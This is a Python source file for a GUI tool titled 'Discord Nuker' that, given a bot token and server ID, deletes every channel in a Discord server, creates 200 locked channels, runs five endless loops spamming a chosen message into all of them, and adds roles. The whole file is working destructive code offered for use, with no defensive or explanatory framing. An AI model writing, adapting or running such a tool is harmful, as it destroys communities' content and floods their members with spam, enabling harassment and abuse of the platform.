import nextcord
import asyncio
import threading
import customtkinter as ctk
from colorama import Fore, Style

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

class NukerGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Discord Nuker")
        self.geometry("500x400")
        self.resizable(False, False)

        self.tabs = ctk.CTkTabview(self)
        self.tabs.pack(expand=True, fill="both", padx=10, pady=10)

        # Main Tab
        self.main_tab = self.tabs.add("Main")
        # Bot Token entry at the top
        self.token_entry = ctk.CTkEntry(self.main_tab, placeholder_text="Bot Token", show="*", width=350)
        self.token_entry.pack(pady=(10, 0))
        self.guild_id_entry = ctk.CTkEntry(self.main_tab, placeholder_text="Guild ID", width=350)
        self.guild_id_entry.pack(pady=10)
        self.name_entry = ctk.CTkEntry(self.main_tab, placeholder_text="Name for channels and roles", width=350)
        self.name_entry.pack(pady=10)
        # Use CTkTextbox for multi-line message input
        self.message_label = ctk.CTkLabel(self.main_tab, text="Message to send in every channel:")
        self.message_label.pack(pady=(10, 0))
        self.message_entry = ctk.CTkTextbox(self.main_tab, height=60, width=350, wrap="word")
        self.message_entry.pack(pady=5)
        self.start_button = ctk.CTkButton(self.main_tab, text="Start", command=self.start_nuker)
        self.start_button.pack(pady=20)

        # Logs Tab
        self.logs_tab = self.tabs.add("Logs")
        self.log_textbox = ctk.CTkTextbox(self.logs_tab, state="disabled", wrap="word", width=450)
        self.log_textbox.pack(expand=True, fill="both", padx=10, pady=10)

        self.loop = asyncio.new_event_loop()
        self.client = nextcord.Client(intents=nextcord.Intents.default())
        self.setup_events()

    def log(self, message):
        self.log_textbox.configure(state="normal")
        self.log_textbox.insert("end", message + "\n")
        self.log_textbox.see("end")
        self.log_textbox.configure(state="disabled")

    def setup_events(self):
        @self.client.event
        async def on_ready():
            self.log(f'Logged in as {self.client.user}')
            try:
                guild_id = int(self.guild_id)
                guild = self.client.get_guild(guild_id)
                if not guild:
                    self.log("Failed to find guild.")
                    return

                # Bulk delete channels
                delete_tasks = [channel.delete() for channel in guild.channels]
                await asyncio.gather(*delete_tasks)
                self.log("Deleted all channels!")

                # Bulk create channels
                create_tasks = []
                for _ in range(200):
                    overwrites = {
                        guild.default_role: nextcord.PermissionOverwrite(send_messages=False)
                    }
                    create_tasks.append(guild.create_text_channel(self.name, overwrites=overwrites))
                created_channels = await asyncio.gather(*create_tasks)
                self.log("Created 200 channels!")

                # Function to continuously send messages in all channels
                async def spam_messages():
                    while True:
                        message_tasks = [channel.send(self.message) for channel in created_channels]
                        await asyncio.gather(*message_tasks)
                        self.log("Sent message in all channels simultaneously!")
                        await asyncio.sleep(1)

                for _ in range(5):
                    self.client.loop.create_task(spam_messages())

                # Bulk create roles
                role_tasks = [guild.create_role(name=self.name) for _ in range(5)]
                await asyncio.gather(*role_tasks)
                self.log("Created 5 roles!")
            except Exception as e:
                self.log(f"Error: {e}")

    def start_nuker(self):
        self.guild_id = self.guild_id_entry.get()
        self.name = self.name_entry.get()
        self.message = self.message_entry.get("1.0", "end-1c")
        self.token = self.token_entry.get()  # Get token from the entry box
        threading.Thread(target=self.run_bot, daemon=True).start()

    def run_bot(self):
        asyncio.set_event_loop(self.loop)
        try:
            self.client.run(self.token)
        except Exception as e:
            self.log(f"Failed to run bot: {e}")

if __name__ == "__main__":
    app = NukerGUI()
    app.mainloop()
